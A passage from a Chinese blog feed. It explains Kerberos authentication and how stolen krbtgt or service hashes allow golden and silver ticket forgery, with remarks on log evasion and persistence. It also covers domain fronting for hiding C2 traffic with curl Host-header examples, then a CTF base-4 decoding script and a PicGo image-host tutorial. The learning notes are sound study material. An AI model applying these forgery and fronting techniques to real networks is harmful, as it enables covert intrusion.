<p>TGT（<strong>Msg B</strong>）中包含如下信息：</p>
<p>– [Client/TGS SessionKey]<br />
– Client ID<br />
– Ticket 有效时间<br />
– Client 地址</p>
</li>
</ul>
<p>6、从解密的 Msg A 中提取的 Client/TGS SessionKey（Client/TGS 会话密钥）。</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>客户端无法解密Msg <span class="token constant">B</span>，即无法解密<span class="token constant">TGT</span>，解密需要<span class="token constant">TGS</span>密钥，但是密钥存在于<span class="token constant">KDC</span>上</pre></td></tr><tr><td data-num="2"></td><td><pre>需要了解：<span class="token constant">TGS</span>密钥 <span class="token operator">==</span> <span class="token constant">KDC</span> Hash <span class="token operator">==</span> krbtgt用户的<span class="token constant">NTLM</span> Hash</pre></td></tr></table></figure><p>AS 响应的消息中有一条是属于 Client 的，但另外一条却属于 TGS。<br />
认证过程中的加密除哈希外均采用的是对称加密算法。</p>
<h5 id="3-票据授予服务tgs认证流程"><a class="anchor" href="#3-票据授予服务tgs认证流程">#</a> 3、票据授予服务（TGS）认证流程</h5>
<h6 id="31-客户端向tgs发送请求服务授权请求"><a class="anchor" href="#31-客户端向tgs发送请求服务授权请求">#</a> 3.1 客户端向 TGS 发送请求服务授权请求</h6>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211126153258376.png" alt="image-20211126153258376" /></p>
<p>1、客户端发送消息 Msg C，以及 Msg D</p>
<ul>
<li>
<p><strong>Msg C</strong><br />
– 要请求的服务 ID, 即 [Service ID]<br />
– 上一步 2.2 中由 AS 为 Client 提供的 TGT。</p>
</li>
<li>
<p><strong>Msg D</strong><br />
– 使用 Client/TGS SessionKey 加密的 Authenticator 1 {Client ID, Timestamp}。</p>
</li>
</ul>
<p>2、TGS 获取两个请求 <strong>Msg C</strong> 和 <strong>Msg D</strong>，先从 <strong>Msg C</strong> 中获取 TGT 以及服务 ID。</p>
<p>3、TGS 接下来使用 TGS 密钥（即 krbtgt 用户的 NTLM Hash）解密 TGT，从 TGT 中提取到 <strong>Client/TGS SessionKey</strong> ，TGS 现在有了<strong> Client/TGS SessionKey</strong>。</p>
<p>4、TGS 此时使用 <strong>Client/TGS SessionKey</strong> 解密<strong> Msg D</strong>，获得 Authenticator 1 {Client ID, Timestamp}。</p>
<p>5、TGS 比较 <strong>Msg C</strong> 以及 Msg D 获取到的 Client ID。</p>
<p>6、如果相同 TGS 生成 <strong>Msg E</strong> 以及<strong> Msg F</strong>，不同则报错误。</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token constant">TGT</span>在其生命周期内被缓存，并用于请求客户端需要的每个新服务票证。</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token constant">CLIENT</span><span class="token operator">/</span><span class="token constant">TGS</span> <span class="token constant">SESSIONKEY</span>也由客户端缓存。</pre></td></tr></table></figure><h6 id="32-tgs为client响应服务授权票据"><a class="anchor" href="#32-tgs为client响应服务授权票据">#</a> 3.2 TGS 为 Client 响应服务授权票据</h6>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211126153837025.png" alt="image-20211126153837025" /></p>
<p>1、客户端接收到 TGS 发送的 <strong>Msg E</strong> 以及 Msg F</p>
<ul>
<li>
<p><strong>Msg E</strong> 使用 <strong>SERVICE 密钥</strong> (服务器的 NTLM HASH) 加密的 <strong>CLIENT-TO-SERVER TICKET</strong>，该 Ticket 中包含了如下信息:<br />
– [Client/Server SessionKey]<br />
– Client 网络地址<br />
– Ticket 有效时间<br />
– Client ID</p>
</li>
<li>
<p><strong>Msg F</strong> 使用  <code>Client/TGS SessionKey</code>  加密的  <code>Client/Server SessionKey</code></p>
</li>
</ul>
<p>2、客户端使用  <code>CLIENT/TGS SESSIONKEY</code>  解密 <code>Msg F</code>  获得  <code>CLIENT/SERVER SESSIONKEY</code></p>
<ul>
<li><strong>Msg E</strong> 使用了 <strong>[SERVICE 密钥]</strong> 加密，该消息可视作是 TGS 给 Service Server 的消息，只不过由 Client 一起携带发送给 Service Server</li>
</ul>
<h5 id="4发送服务请求"><a class="anchor" href="#4发送服务请求">#</a> 4. 发送服务请求</h5>
<h6 id="41-client向service-server发送服务请求"><a class="anchor" href="#41-client向service-server发送服务请求">#</a> 4.1 Client 向 Service Server 发送服务请求</h6>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211126154223422.png" alt="image-20211126154223422" /></p>
<p>1、客户端生成 <strong>Msg E</strong> 和 <strong>Msg G</strong>（Authenticator 2）。</p>
<ul>
<li><strong>Msg E</strong> 上一步 3.2 中，TGS 为客户端响应的消息 <strong>Msg E</strong>。该消息可以理解为由客户端携带的消息。</li>
<li><strong>Msg G</strong> 由 Client/Server SessionKey 加密的 Authenticator 2，包含 {Client ID, Timestamp} 信息。</li>
</ul>
<p>2、客户端将 <strong>Msg E</strong> 和 <strong>Msg G</strong> 发送到服务器（SS）。<br />
3、服务器使用其自己的密钥对 <strong>Msg E</strong>（ticket）进行解密，得到 <strong>Client/Server SessionKey</strong><br />
4、服务器使用上一步得到的 <strong>Client/Server SessionKey</strong> 解密 <strong>Msg G</strong><br />
5、比较消息 <strong>Msg E</strong> 和 <strong>Msg G</strong> 中的 Client ID。<br />
6、如果匹配，则将<strong> Msg H</strong> 发送给客户端，以确认服务器身份和服务客户端请求的意愿（此部分是可选的）。</p>
<h6 id="42-service-server响应client"><a class="anchor" href="#42-service-server响应client">#</a> 4.2 Service Server 响应 Client</h6>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211126154431559.png" alt="image-20211126154431559" /></p>
<p>1、客户端收到 Msg H。</p>
<ul>
<li>Msg H 是 Client/Server SessionKey 加密的时间戳</li>
</ul>
<p>2、客户端使用 Client/Server SessionKey 解密 Msg H。<br />
3、客户端检查 Msg H 的时间戳。<br />
4、客户端现在信任服务器，可以与服务器进行交互。</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>来自<span class="token constant">SS</span>的响应（Msg <span class="token constant">H</span>）是可选的。仅在客户端希望<span class="token constant">SS</span>对其自身进行身份验证时才需要这样做（即相互身份验证）。</pre></td></tr></table></figure><h6 id="认证流程中需要关注的点票据伪造的原理"><a class="anchor" href="#认证流程中需要关注的点票据伪造的原理">#</a> <strong>认证流程中需要关注的点，票据伪造的原理</strong></h6>
<ul>
<li>
<p>2.2 AS 确认 Client 端登录者用户身份<br />
– KDC 返回的 Msg B：使用 TGS 密钥 (KDCHASH/KRBTGT 用户 NTLMHASH) 加密的 TGT (Ticket-Granting-Ticket)，当我们获取到 krbtgt 用户的 NTLM 哈希后，便可主动使用 krbtgt 用户的 NTLM 哈希做为 TGS 密钥来生成 TGT 发送给 KDC，这样 KDC 如果通过解密伪造 TGT 获取到伪造的 [CLIENT/TGS SESSIONKEY] 可以成功解密 Authenticator 1 并完成与 TGT 中的数据进行比对，便成功骗过了 KDC，也就是成功伪造了黄金票据</p>
</li>
<li>
<p>4.1 Client 向 SSService Server 发送服务请求<br />
– 客户端向服务器发送的为使用 SERVICE 密钥 (服务器的 NTLMHASH) 加密的 CLIENT-TO-SERVER TICKET Ticket 中包含用来供服务器解密 Authenticator 2 的 CLIENT/SERVER SESSIONKEY 。如果获取到了 Service Server 的 NTLM Hash，便可伪造 Ticket，和 Authenticator 2 ，Service Server 在接收到 Ticket 和 Authenticator 2 后可以使用自己的 NTLM Hash 正常解密完成比对，也就是成功伪造了白银票据</p>
</li>
</ul>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">1</span>、黄金票据与白银票据需要拿到krbtgt或者server用户的hash，所以只能做为后门使用</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token number">2</span>、白银票据利用之后无日志，所以比黄金票据更好</pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token number">3</span>、关于Service Hash，Service Hash其实是目标中一个用户名与hostname相同的用户的Hash</pre></td></tr><tr><td data-num="4"></td><td><pre>如hostname为<span class="token constant">PC</span><span class="token operator">-</span><span class="token constant">WIN7</span><span class="token literal-property property">的服务器，对应的Hash就是Username</span> <span class="token operator">:</span> <span class="token constant">PC</span><span class="token operator">-</span><span class="token constant">WIN7</span>$的哈希</pre></td></tr></table></figure><p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211126154653353.png" alt="image-20211126154653353" /></p>
<h5 id="黄金白银票据"><a class="anchor" href="#黄金白银票据">#</a> 黄金白银票据</h5>
<h6 id="白银票据"><a class="anchor" href="#白银票据">#</a> 白银票据</h6>
<ul>
<li>
<p>原理（伪造 Server Hash 被加密的 Ticket）</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>Client 向Server 发起请求的时候，票据为Server <span class="token function">Hash</span><span class="token punctuation">(</span>Ticket<span class="token punctuation">)</span>和Server Session <span class="token function">Key</span><span class="token punctuation">(</span>Client Info<span class="token operator">+</span>Timestamp<span class="token punctuation">)</span>而Server 除了Server Hash以外，其他都是不知道的；</pre></td></tr><tr><td data-num="2"></td><td><pre>从而，一旦知道了Server Hash后，就可以伪造Server Session Key并生成伪造的Ticket和伪造的Server Session <span class="token function">Key</span><span class="token punctuation">(</span>Client Info<span class="token operator">+</span>Timestamp<span class="token punctuation">)</span>；</pre></td></tr><tr><td data-num="3"></td><td><pre>将伪造的Ticket使用Server Hash加密，就得到了伪造的Server <span class="token function">Hash</span><span class="token punctuation">(</span>Ticket<span class="token punctuation">)</span>；</pre></td></tr><tr><td data-num="4"></td><td><pre>最后将伪造的Server <span class="token function">Hash</span><span class="token punctuation">(</span>Ticket<span class="token punctuation">)</span>和Server Session <span class="token function">Key</span><span class="token punctuation">(</span>Client Info<span class="token operator">+</span>Timestamp<span class="token punctuation">)</span>发送给Srever 即可以验证通过。</pre></td></tr></table></figure></li>
<li>
<p>特点</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>需要目标服务的<span class="token constant">NTML</span> Hash，即Server Hash；</pre></td></tr><tr><td data-num="2"></td><td><pre>不需要与<span class="token constant">KDC</span> 交互；</pre></td></tr><tr><td data-num="3"></td><td><pre>只能访问指定服务器；</pre></td></tr></table></figure></li>
</ul>
<h6 id="黄金票据"><a class="anchor" href="#黄金票据">#</a> 黄金票据</h6>
<ul>
<li>
<p>原理（伪造被 krbtgt Hash 加密的 TGT）</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>在Client向<span class="token constant">AS</span> 发送验证信息的时候，验证消息为：</pre></td></tr><tr><td data-num="2"></td><td><pre>Session <span class="token function">Key</span><span class="token punctuation">(</span>Client Info<span class="token operator">+</span>Timestamp<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="3"></td><td><pre>Client Info<span class="token operator">+</span>Server Info</pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token constant">KDC</span> <span class="token function">Hash</span><span class="token punctuation">(</span><span class="token constant">TGT</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="5"></td><td><pre>而<span class="token constant">AS</span> 又是使用<span class="token constant">KDC</span> Hash（krbtgt Hash）解密<span class="token constant">KDC</span> <span class="token function">Hash</span><span class="token punctuation">(</span><span class="token constant">TGT</span><span class="token punctuation">)</span>得到<span class="token constant">TGT</span>，并从<span class="token constant">TGT</span>中获得session Key；</pre></td></tr><tr><td data-num="6"></td><td><pre>最后再利用Session Key去解密Session <span class="token function">Key</span><span class="token punctuation">(</span>Client Info<span class="token operator">+</span>Timestamp<span class="token punctuation">)</span>获得Client Info<span class="token operator">+</span>Server Info，去对比未加密的Client Info<span class="token operator">+</span>Server Info是否一致从而验证客户端身份；</pre></td></tr><tr><td data-num="7"></td><td><pre>所以，如果知道了<span class="token constant">KDC</span> Hash（krbtgt Hash）就可以伪造session Key，从而伪造<span class="token constant">KDC</span> <span class="token function">Hash</span><span class="token punctuation">(</span><span class="token constant">TGT</span><span class="token punctuation">)</span>，进而发送伪造的：</pre></td></tr><tr><td data-num="8"></td><td><pre>Session <span class="token function">Key</span><span class="token punctuation">(</span>Client Info<span class="token operator">+</span>Timestamp<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="9"></td><td><pre>Client Info<span class="token operator">+</span>Server Info</pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token constant">KDC</span> <span class="token function">Hash</span><span class="token punctuation">(</span><span class="token constant">TGT</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="11"></td><td><pre>最终达到身份验证的目的；</pre></td></tr></table></figure></li>
<li>
<p>特点</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>需要<span class="token constant">KDC</span> Hash（krbtgt Hash）；</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token constant">AS</span>直接验证通过；</pre></td></tr><tr><td data-num="3"></td><td><pre>可以访问任意服务器；</pre></td></tr></table></figure></li>
</ul>
<h3 id="00x03域前置简单了解"><a class="anchor" href="#00x03域前置简单了解">#</a> 00x03. 域前置简单了解</h3>
<h4 id="原理"><a class="anchor" href="#原理">#</a> 原理</h4>
<p>域前置（Domain fronting），是一种隐藏连接真实端点来规避互联网审查的技术。在应用层上运作时，域前置使用户能通过 HTTPS 连接到被屏蔽的服务，而表面上像是在与另一个完全不同的站点通信。</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211126172348403.png" alt="image-20211126172348403" /></p>
<p>假设有两个主机，<span class="exturl" data-url="aHR0cDovL3huLS13d3ctYzg4ZHA3b21neThqczhqLmEueG4tLWNvbXd3dy01cDdpLmIuY29t">域名分别为 www.a.com 与 www.b.com</span>。这两个主机都是被 ip 为 1.1.1.1 的 cdn 进行加速的。</p>
<p>这时候使用 curl 命令请求 cdn 1.1.1.1，并自定义 host 段为 www.b.com 的话。就会返回 www.b.com 的页面。</p>
<p>命令为： <code>curl 1.1.1.1 -H &quot;Host: www.b.com&quot; -v</code></p>
<p>同理请求同样的 cdn，<span class="exturl" data-url="aHR0cDovL3huLS1ob3N0d3d3LWk3M2t1MWZ1NjRjamZ2Z3VjLmEuY29t">但是将 host 改为 www.a.com</span>, 这时候就会返回 A 页面的信息。</p>
<p>如果将 curl 后请求的 ip 改为 <span class="exturl" data-url="aHR0cDovL3d3dy5hLmNvbQ==">www.a.com</span>, host 改为 <span class="exturl" data-url="aHR0cDovL3d3dy5iLmNvbQ==">www.b.com</span>。命令为：</p>
<figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tr><td data-num="1"></td><td><pre>Curl www.a.com -H <span class="token string">"Host: www.b.com"</span> -v</pre></td></tr></table></figure><p>上述命令还是显示的是 www.b.com 的页面，<span class="exturl" data-url="aHR0cDovL3huLS13d3ctdnM5ZHc4OWZ4aGYxcGJ4OHZqaXhzMnN6ZTdhc3pqLmIuY29t"> 所以最终请求的还是 www.b.com</span>。</p>
<p>所以，域前置技术的核心基础设施是 cdn。</p>
<p>当使用 https 的时候 (一般都会使用 https，http 明文流量容易被检测到)，技术实现的核心是在不同的通信层使用不同的域名，DNS 解析的时候跟 TLS 服务器名称指示 (sin), 的时候使用的是合法的 CDN 的域名或者 ip (建议使用域名)，但实际访问域名却是 host 上写的域名.</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>host头对于检查器是不可见的，但是对于接受https请求的前端服务器是可见的。</pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre>简单理解：</pre></td></tr><tr><td data-num="4"></td><td><pre>   表面看，头部 <span class="token constant">CDN</span> 通讯域名（我们看得到）；</pre></td></tr><tr><td data-num="5"></td><td><pre></pre></td></tr><tr><td data-num="6"></td><td><pre>   实际内部，尾部真实 <span class="token constant">IP</span>（我们看不到）。</pre></td></tr></table></figure><p>没有域名 emmmm，贴上链接了解一下先</p>
<p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODc0OTMwL2FydGljbGUvZGV0YWlscy8xMDc3NDI4NDM=">域前置技术的原理与 CS 上的实现</span><br />
<span class="exturl" data-url="aHR0cHM6Ly9jbG91ZC50ZW5jZW50LmNvbS9kZXZlbG9wZXIvYXJ0aWNsZS8xNzg1NTYyP2l2a19zYT0xMDI0MzIwdQ==">为你的 C2 配置一个完美的隐藏</span><br />
<span class="exturl" data-url="aHR0cHM6Ly93d3cuYW5xdWFua2UuY29tL3Bvc3QvaWQvMjQzMTQ2">域前置水太深，偷学六娃来隐身 —— 域前置攻击复现</span></p>
<h2 id="感言"><a class="anchor" href="#感言">#</a> 感言：</h2>
<p>接触内网的第二天 emmmmm，好家伙直接给我整的一愣一愣的，跪求佬们带带 QAQ！！！</p>
<h2 id="参考链接"><a class="anchor" href="#参考链接">#</a> 参考链接：</h2>
<p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3d4aDAwMDBtbS9hcnRpY2xlL2RldGFpbHMvMTA1OTk2Mzk3">Windows 内网协议学习 NTLM 篇之 NTLM 基础介绍</span></p>
<p><span class="exturl" data-url="aHR0cHM6Ly9jbG91ZC50ZW5jZW50LmNvbS9kZXZlbG9wZXIvYXJ0aWNsZS8xNjgxMzcz">windows 之 NTLM 认证</span></p>
<p><span class="exturl" data-url="aHR0cHM6Ly9kb2NzLm1pY3Jvc29mdC5jb20vZW4tdXMvb3BlbnNwZWNzL3dpbmRvd3NfcHJvdG9jb2xzL21zLW5sbXAvNzYwYTk3ODgtYmQzMi00ZDllLTg3YWQtMmFhNTk3MDc4NmFj">2.2.1 NTLM Messages</span></p>
<p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2lyb255MGVnb2lzdC9hcnRpY2xlL2RldGFpbHMvMTA5NDkzMTAz">内网渗透 ——WINDOWS 认证机制之 KERBEROS</span></p>
<p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0ODc0NjQ1L2FydGljbGUvZGV0YWlscy8xMTkzODQyMTY/c3BtPTEwMDEuMjEwMS4zMDAxLjY2NTAuMSZhbXA7dXRtX21lZGl1bT1kaXN0cmlidXRlLnBjX3JlbGV2YW50Lm5vbmUtdGFzay1ibG9nLTIlN0VkZWZhdWx0JTdFQ1RSTElTVCU3RWRlZmF1bHQtMS5ub19zZWFyY2hfbGluayZhbXA7ZGVwdGhfMS11dG1fc291cmNlPWRpc3RyaWJ1dGUucGNfcmVsZXZhbnQubm9uZS10YXNrLWJsb2ctMiU3RWRlZmF1bHQlN0VDVFJMSVNUJTdFZGVmYXVsdC0xLm5vX3NlYXJjaF9saW5r">【渗透测试笔记】之【内网渗透 —— 彻底理解 Kerberos 认证和黄金白银票据】</span></p>
]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>内网渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>四进制解码</title>
    <url>/article/4610d5dd.html</url>
    <content><![CDATA[<h2 id="密文直输版"><a class="anchor" href="#密文直输版">#</a> 密文直输版</h2>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre>ciphertxt <span class="token operator">=</span> <span class="token string">'1212 1230 1201 1213 1323 1012 1233 1311 1302 1202 1201 1303 1211 301 302 303 1331'</span></pre></td></tr><tr><td data-num="2"></td><td><pre>c <span class="token operator">=</span> ciphertxt<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="3"></td><td><pre>flag <span class="token operator">=</span> <span class="token string">''</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token keyword">for</span> i <span class="token keyword">in</span> c<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="5"></td><td><pre>    temp <span class="token operator">=</span> <span class="token number">0</span></pre></td></tr><tr><td data-num="6"></td><td><pre>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="7"></td><td><pre>        temp <span class="token operator">+=</span> <span class="token punctuation">(</span><span class="token number">4</span><span class="token operator">**</span>j<span class="token punctuation">)</span><span class="token operator">*</span><span class="token builtin">int</span><span class="token punctuation">(</span>i<span class="token punctuation">[</span><span class="token operator">-</span>j<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="8"></td><td><pre></pre></td></tr><tr><td data-num="9"></td><td><pre>    flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>temp<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span></pre></td></tr></table></figure><h2 id="txt版"><a class="anchor" href="#txt版">#</a> txt 版</h2>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre>m <span class="token operator">=</span> <span class="token string">''</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"txt"</span><span class="token punctuation">,</span><span class="token string">"r"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="3"></td><td><pre>    text <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="4"></td><td><pre>    c <span class="token operator">=</span> text<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="5"></td><td><pre>    <span class="token keyword">for</span> i <span class="token keyword">in</span> c<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="6"></td><td><pre>        temp <span class="token operator">=</span> <span class="token number">0</span></pre></td></tr><tr><td data-num="7"></td><td><pre>        <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="8"></td><td><pre>            temp <span class="token operator">+=</span> <span class="token punctuation">(</span><span class="token number">4</span><span class="token operator">**</span>j<span class="token punctuation">)</span><span class="token operator">*</span><span class="token builtin">int</span><span class="token punctuation">(</span>i<span class="token punctuation">[</span><span class="token operator">-</span>j<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="9"></td><td><pre>        m <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>temp<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>使用PicGo+Github/Gitee+Typroa搭建属于自己的图床</title>
    <url>/article/141d7194.html</url>
    <content><![CDATA[<p>之前写博文上传图片总是件麻烦的事，就想自己搭个图床方便上传图片，于是整理了这一篇文章。</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/69ec183907205bfa4c5b70b4ef19385.jpg" alt="image-69ec183907205bfa4c5b70b4ef19385" /></p>
<h2 id="picgo"><a class="anchor" href="#picgo">#</a> PicGo</h2>
<p>所谓图床，就是自动把本地图片转换成链接的一款工具，网络上有很多图床工具，就目前使用种类而言， <code>PicGo</code>  算得上一款比较优秀的图床工具。它是一款用  <code>Electron-vue</code>  开发的软件，可以支持微博，七牛云，腾讯云 COS，又拍云， <code>GitHub</code> ，阿里云 OSS， <code>SM.MS</code> ， <code>imgur</code>  等 8 种常用图床，功能强大，简单易用。</p>
<p>我们到下面的链接下载最新版本</p>
<p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL01vbHVuZXJmaW5uL1BpY0dvL3JlbGVhc2Vz">https://github.com/Molunerfinn/PicGo/releases</span></p>
<p>根据自己的电脑系统选择下在相应的安装包，如果不是下载安装包，想看源码的话，可以选择 <code>git clone https://github.com/Molunerfinn/PicGo.git</code>  克隆到本地</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211203194648684.png" alt="image-20211203194648684" /></p>
<p>安装后完成之后，会在电脑的任务栏显示相应的图标，点击小图标，选择打开详细窗口，窗口看着还是非常整洁，美观</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211203194703879.png" alt="image-20211203194703879" /></p>
<h2 id="github"><a class="anchor" href="#github">#</a> GitHub</h2>
<p>首先登陆  <code>GitHub</code> ，新建一个仓库或者也可以使用一个已有仓库</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211203194725974.png" alt="image-20211203194725974" /></p>
<p>点击 <code>New repository</code>  创建一个新仓库，自定义仓库名称即可。</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211203194740575.png" alt="image-20211203194740575" /></p>
<p>添加 <code>README</code>  文件形成默认分支。</p>
<p><strong>注</strong>：这里建议选择 <code>Public</code> ，因为私有库只有自己能够访问，因此图片上传上去之后是没法显示的。</p>
<p>创建好后，需要在  <code>GitHub</code>  上生成一个  <code>token</code>  以便  <code>PicGo</code>  来操作我们的仓库，来到个人中心，点击 <code>setting</code>  后下滑可以看到  <code>Developer settings </code></p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211203194757846.png" alt="image-20211203194757846" /></p>
<p>点击 <code>Developer settings</code>  就能看到  <code>Personal access tokens</code> ，我们在这里创建需要的  <code>token</code></p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211203194813733.png" alt="image-20211203194813733" /></p>
<p>点击  <code>Generate new token</code>  创建一个新  <code>token</code> ，选择  <code>repo</code> ，同时它会把包含其中的都会勾选上，我们勾选这些就可以了。然后拉到最下方点击绿色按钮， <code>Generate token</code>  即可。然后这里会生成一个  <code>token</code>  ，记得复制保存到其他地方，因为这个  <code>token</code>  只显示一次！！</p>
<h3 id="配置-picgo"><a class="anchor" href="#配置-picgo">#</a> 配置 PicGo</h3>
<p>打开  <code>PicGo</code>  面板，</p>
<ul>
<li>仓库名格式为  <code>用户名/仓库名</code></li>
<li>分支名： <code>master</code></li>
<li>token：上一个咱们创建的 <code>token</code></li>
</ul>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211203194829243.png" alt="image-20211203194829243" /></p>
<p>然后点击确定即可完成绑定，然后设置成默认图床即可。</p>
<p>工具默认上传前不做重命名，如果需要在上传前重新命名，我们可以到  <code>PicGo</code>  设置中进行设置，把上传前重命名开关打开即可。</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211203194847622.png" alt="image-20211203194847622" /></p>
<p>与此同时，除了单张上传外，其实还支持多张，批量上传，只需要选中多个文件，将其导入，或者拖入其中便可以了，这样再多的文件，也能够做到一次上传就能用的效果。</p>
<h3 id="效果"><a class="anchor" href="#效果">#</a> 效果</h3>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211203194900932.png" alt="image-20211203194900932" /></p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211203194913223.png" alt="image-20211203194913223" /></p>
<h2 id="gitee"><a class="anchor" href="#gitee">#</a> Gitee</h2>
<p>为什么又换成了 <code>Gitee</code> ？因为 <code>Github</code>  的网络对国内不稳定，所以就换成了 <code>Gitee</code> 。</p>
<p><code>PicGo</code>  默认是不支持码云，也就是 <code>Gitee</code> ，所以需要先下载插件，具体下载操作如下：</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211203193907542.png" alt="image-20211203193907542" /></p>
<h3 id="配置码云信息"><a class="anchor" href="#配置码云信息">#</a> 配置码云信息</h3>
<p>首先将 <code>gitee</code>  添加到我们的图床设置</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211203193953049.png" alt="image-20211203193953049" /></p>
<p>完成后，可以看到左方菜单栏 “<strong>图床设置</strong>”—&gt; &quot;<strong>gitee</strong>&quot;</p>
<h3 id="创建码云仓库"><a class="anchor" href="#创建码云仓库">#</a> 创建码云仓库</h3>
<p>这里的做法和在 <code>Github</code>  上差不多</p>
<p>登录 <code>Gitee</code> ：<span class="exturl" data-url="aHR0cHM6Ly9naXRlZS5jb20v">https://gitee.com/</span><br />
 进入个人主页，点击新建仓库</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211203194019193.png" alt="image-20211203194019193" /></p>
<p>填写基本仓库基本信息保存即可。</p>
<p><strong>注</strong>：这里同样选择<strong>公开仓库</strong></p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211203194112487.png" alt="image-20211203194112487" /></p>
<h3 id="获取仓库访问token"><a class="anchor" href="#获取仓库访问token">#</a> 获取仓库访问 token</h3>
<p><code>PicGo</code>  上传图片需要通过 <code>gitee</code>  的 <code>API</code> ，因此要获取 <code>token</code>  授权，获取方式如下：</p>
